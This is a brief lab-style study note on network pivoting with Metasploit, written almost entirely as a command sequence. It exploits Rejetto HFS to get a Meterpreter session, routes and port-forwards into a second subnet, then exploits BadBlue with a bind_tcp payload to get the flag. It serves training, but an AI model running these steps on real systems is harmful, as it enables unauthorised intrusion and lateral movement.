# Pivoting

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 11422–11474. Examples are lab-specific and need verification.

# Pivoting

- `service postgresql start && msfconsole`
- `workspace -a Pivoting`
- `db_nmap -sV -p- -O <Victim1IP>`
- `services`
- `search rejetto`
- `use exploit/windows/http/rejetto_hfs_exec`
- `show options`
- `set rhosts <Victim1IP>`
- `run`
- Got Meterpreter session
- `sysinfo`
- `getuid`
- `ipconfig`
- `run autoroute -s <Victim2IP/24>`
- run this in background
- `background`
- rename the session 1 meterpreter
- `sessions -n victim1 -i 1`
- `sessions`
- Now portscan
- `search portscan`
- `use auxiliary/scanner/portscan/tcp`
- `show options`
- `set rhosts Victim2iP`
- `exploit`
- Port 80 open port found on victim2
- Now go to session in metereter
- `sessions 1`
- `portfwd add -l 1234 -p 80 -r <Victim2IP>`
- Now again put this session in background
- `background`
- `db_nmap -sV -sS -p 1234 localhost`
- `search badblue`
- `use exploit/windows/http/badblue_passthru`
- `show options`
- `set payload windows/meterpreter/bind_tcp`
- `set rhosts <Victim2IP>`
- `set LPORT 4433`
- `run`
- got meterpreter session
- Observe that this is 2016 and old is 2012
- get flag

```bash
ls
service postgresql start
msfconsole

```
